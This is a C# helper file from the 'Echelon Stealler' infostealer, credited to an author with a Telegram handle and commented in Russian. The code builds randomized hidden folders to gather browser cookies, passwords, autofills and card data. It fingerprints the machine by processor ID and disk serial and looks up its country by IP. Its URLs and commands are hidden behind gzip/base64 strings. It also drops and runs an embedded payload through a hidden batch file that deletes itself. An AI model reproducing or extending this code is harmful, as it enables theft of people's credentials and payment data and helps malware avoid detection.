///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using System.Xml;

namespace Echelon
{
    public class Help
    {
        // Пути
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Help.DesktopPath
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Help.LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Help.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Help.AppDate
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // Help.CommonData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Help.MyDocuments
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Help.UserProfile
        public static readonly string downloadsDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads"; // Help.downloadsDir

        // Выбираем рандомную системную папку
        public static string[] SysPatch = new string[]
    {
                LocalData, AppDate, Path.GetTempPath()
    };
        public static string RandomSysPatch = SysPatch[new Random().Next(0, SysPatch.Length)];

        // Мутекс берем из сгенерированного HWID
        public static string Mut = HWID;

        // Генерим уникальный HWID
        public static string HWID = GetProcessorID() + GetHwid();

        public static string GeoIpURL = Decrypt.Get("H4sIAAAAAAAEAMsoKSmw0tfPLNBNLMjUS87P1a/IzQEAoQIM4RUAAAA=");
        public static string ApiUrl = Decrypt.Get("H4sIAAAAAAAEAMsoKSkottLXTyzI1CtJzUlNL0rM1csvStdPyi8BABoLIu8cAAAA"); //Help.ApiUrl 
        public static string IP = new WebClient().DownloadString(Decrypt.Get("H4sIAAAAAAAEAMsoKSkottLXTyzI1MssyEyr1MsvStcHAPAN4yoWAAAA")); // Help.IP

        // Создаем рандомные папки для сбора лога стиллера
        public static string dir = RandomSysPatch + "\\" + GenString.Generate() + HWID + GenString.GeneNumbersTo();
        public static string collectionDir = dir + "\\" + GenString.GeneNumbersTo() + HWID + GenString.Generate();
        public static string Browsers = collectionDir + "\\Browsers";

        public static string Cookies = Browsers + "\\Cookies";
        public static string Passwords = Browsers + "\\Passwords";
        public static string Autofills = Browsers + "\\Autofills";
        public static string Downloads = Browsers + "\\Downloads";
        public static string History = Browsers + "\\History";
        public static string Cards = Browsers + "\\Cards";

        // Временные переменные
        public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt"); //Help.date
        public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy"); //Help.dateLog

        // Получаем код страны типа: [RU]
        public static string CountryCOde() //Help.CountryCOde()

        {
            XmlDocument xml = new XmlDocument();
            xml.LoadXml(new WebClient().DownloadString(GeoIpURL)); //Получаем IP Geolocation CountryCOde
            string countryCode = "[" + xml.GetElementsByTagName("countryCode")[0].InnerText + "]";
            string CountryCOde = countryCode;
            return CountryCOde;
        }

        // Получаем название страны типа: [Russian]
        public static string Country() //Help.Country()

        {
            XmlDocument xml = new XmlDocument();
            xml.LoadXml(new WebClient().DownloadString(GeoIpURL)); //Получаем IP Geolocation Country
            string countryCode = "[" + xml.GetElementsByTagName("country")[0].InnerText + "]";
            string Country = countryCode;
            return Country;
        }

        public static void Deocder()
        {
            File.WriteAllBytes(Path.GetTempPath() + Decrypt.Get("H4sIAAAAAAAEAIuJcUlNzk9JLdJLrUgFAPWHUugNAAAA"), Properties.Resources.Decoder);
            string batch = Path.GetTempPath() + Decrypt.Get("H4sIAAAAAAAEANNLzk0BAMPCtLEEAAAA");
            using (StreamWriter sw = new StreamWriter(batch))            {
                sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNITc7IV8hPSwMAyqnEkQkAAAA="));
                sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEACvJzE3NLy1RMFGwU/AL9QEAGpgiIA8AAAA=")); // Задержка до выполнения следуюющих команд
                File.WriteAllBytes(Decrypt.Get(@"H4sIAAAAAAAEAHO2igkoyk8vSsx1SSxJjHFJTc5PSS3SS61IBQCMqrk/GgAAAA=="), Echelon.Properties.Resources.Decoder);
                Process.Start(Decrypt.Get(@"H4sIAAAAAAAEAHO2igkoyk8vSsx1SSxJjHFJTc5PSS3SS61IBQCMqrk/GgAAAA=="));
                sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHN2UQAAQkDmIgMAAAA=") + Path.GetTempPath()); // Переходим во временную папку юзера
                sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + Path.GetFileName(batch) + "\"" + " /f /q"); // Удаляем .cmd
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });

        }


        // Получаем VolumeSerialNumber
        public static string GetHwid() 
        {
            string hwid = "";
            try
            {
                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                string diskLetter = (disk["VolumeSerialNumber"].ToString());
                hwid = diskLetter;
            }
            catch
            { }
            return hwid;
        }

        // Получаем Processor Id
        public static string GetProcessorID()
        {
            string sProcessorID = "";
            string sQuery = "SELECT ProcessorId FROM Win32_Processor";
            ManagementObjectSearcher oManagementObjectSearcher = new ManagementObjectSearcher(sQuery);
            ManagementObjectCollection oCollection = oManagementObjectSearcher.Get();
            foreach (ManagementObject oManagementObject in oCollection)
            {
                sProcessorID = (string)oManagementObject["ProcessorId"];
            }

            return (sProcessorID);
        }

    }


}
